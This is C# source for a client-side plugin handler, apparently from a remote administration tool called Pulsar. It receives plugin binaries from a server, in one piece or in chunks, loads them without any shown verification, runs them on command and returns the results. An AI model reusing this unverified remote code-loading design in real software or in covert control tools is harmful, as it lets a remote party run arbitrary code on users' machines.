using Pulsar.Client.Plugin;
using Pulsar.Plugin.Common;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Plugin;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Common.IO;
using System;
using System.Collections.Concurrent;

namespace Pulsar.Client.Messages
{    
    /// <summary>
    /// Handles plugin-related messages on the client side.
    /// </summary>
    public class PluginHandler : IMessageProcessor
    {
        private readonly ClientPluginManager _pluginManager;
        private readonly ConcurrentDictionary<string, PluginReconstructor> _activeReconstructions;

        public PluginHandler()
        {
            _pluginManager = new ClientPluginManager();
            _activeReconstructions = new ConcurrentDictionary<string, PluginReconstructor>();
        }

        public bool CanExecute(IMessage message) => message is DoPluginDistribution || 
                                                    message is DoPluginDistributionChunk || 
                                                    message is DoPluginDistributionComplete ||
                                                    message is DoPluginExecution;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoPluginDistribution distribution:
                    Execute(sender, distribution);
                    break;
                case DoPluginDistributionChunk chunk:
                    Execute(sender, chunk);
                    break;
                case DoPluginDistributionComplete complete:
                    Execute(sender, complete);
                    break;
                case DoPluginExecution execution:
                    Execute(sender, execution);
                    break;
            }
        }        
        
        private void Execute(ISender sender, DoPluginDistribution message)
        {
            try
            {
                bool loaded = _pluginManager.LoadPlugin(message.PluginName, message.PluginContent);
                
                if (loaded)
                {
                    sender.Send(new SetStatus { Message = $"Plugin '{message.PluginName}' loaded successfully" });
                }
                else
                {
                    sender.Send(new SetStatus { Message = $"Failed to load plugin '{message.PluginName}'" });
                }
            }
            catch (Exception ex)
            {
                sender.Send(new SetStatus { Message = $"Error loading plugin '{message.PluginName}': {ex.Message}" });
            }
        }

        private void Execute(ISender sender, DoPluginDistributionChunk message)
        {
            try
            {
                PluginReconstructor reconstructor;

                if (message.IsFirstChunk)
                {
                    if (_activeReconstructions.TryRemove(message.PluginName, out var existingReconstructor))
                    {
                        existingReconstructor.Dispose();
                    }

                    reconstructor = new PluginReconstructor(message.PluginName, message.TotalSize, message.TotalChunks);
                    _activeReconstructions[message.PluginName] = reconstructor;
                    
                    sender.Send(new SetStatus { Message = $"Starting reception of plugin '{message.PluginName}' ({message.TotalSize} bytes, {message.TotalChunks} chunks)" });
                }
                else
                {
                    if (!_activeReconstructions.TryGetValue(message.PluginName, out reconstructor))
                    {
                        sender.Send(new SetStatus { Message = $"Error: No active reconstruction found for plugin '{message.PluginName}'" });
                        return;
                    }
                }

                bool chunkAdded = reconstructor.AddChunk(message.Chunk);
                if (chunkAdded)
                {
                    sender.Send(new SetStatus { Message = $"Received chunk {message.ChunkIndex + 1}/{message.TotalChunks} for plugin '{message.PluginName}' ({reconstructor.ProgressPercentage:F1}%)" });
                }

                if (message.IsLastChunk && reconstructor.IsComplete)
                {
                    try
                    {
                        byte[] completeData = reconstructor.GetCompleteData();
                        bool loaded = _pluginManager.LoadPlugin(message.PluginName, completeData);

                        _activeReconstructions.TryRemove(message.PluginName, out _);
                        reconstructor.Dispose();

                        if (loaded)
                        {
                            sender.Send(new SetStatus { Message = $"Plugin '{message.PluginName}' received and loaded successfully" });
                        }
                        else
                        {
                            sender.Send(new SetStatus { Message = $"Plugin '{message.PluginName}' received but failed to load" });
                        }
                    }
                    catch (Exception ex)
                    {
                        sender.Send(new SetStatus { Message = $"Error reconstructing plugin '{message.PluginName}': {ex.Message}" });
                        _activeReconstructions.TryRemove(message.PluginName, out _);
                        reconstructor.Dispose();
                    }
                }
            }
            catch (Exception ex)
            {
                sender.Send(new SetStatus { Message = $"Error processing plugin chunk for '{message.PluginName}': {ex.Message}" });
            }
        }

        private void Execute(ISender sender, DoPluginDistributionComplete message)
        {
            try
            {
                if (_activeReconstructions.TryRemove(message.PluginName, out var reconstructor))
                {
                    reconstructor.Dispose();
                }

                if (message.Success)
                {
                    sender.Send(new SetStatus { Message = $"Plugin '{message.PluginName}' distribution completed successfully" });
                }
                else
                {
                    sender.Send(new SetStatus { Message = $"Plugin '{message.PluginName}' distribution failed: {message.ErrorMessage}" });
                }
            }
            catch (Exception ex)
            {
                sender.Send(new SetStatus { Message = $"Error handling plugin distribution completion for '{message.PluginName}': {ex.Message}" });
            }
        }

        private void Execute(ISender sender, DoPluginExecution message)
        {
            try
            {
                if (message.Type == PluginOperationType.Execute)
                {
                    // Client executing plugin
                    byte[] result = _pluginManager.ExecutePlugin(message.PluginName, message.Output);
                    
                    if (result != null)
                    {
                        // Send response back to server
                        sender.Send(new DoPluginExecution
                        {
                            PluginName = message.PluginName,
                            WorkId = message.WorkId,
                            Type = PluginOperationType.Response,
                            Output = result
                        });
                    }
                    else
                    {
                        // Send error back to server
                        sender.Send(new DoPluginExecution
                        {
                            PluginName = message.PluginName,
                            WorkId = message.WorkId,
                            Type = PluginOperationType.Error,
                            Output = System.Text.Encoding.UTF8.GetBytes($"Plugin '{message.PluginName}' execution failed")
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                // Send error back to server
                sender.Send(new DoPluginExecution
                {
                    PluginName = message.PluginName,
                    WorkId = message.WorkId,
                    Type = PluginOperationType.Error,
                    Output = System.Text.Encoding.UTF8.GetBytes($"Plugin execution error: {ex.Message}")
                });
            }
        }

        /// <summary>
        /// Gets the plugin manager instance.
        /// </summary>
        public ClientPluginManager PluginManager => _pluginManager;
    }
}
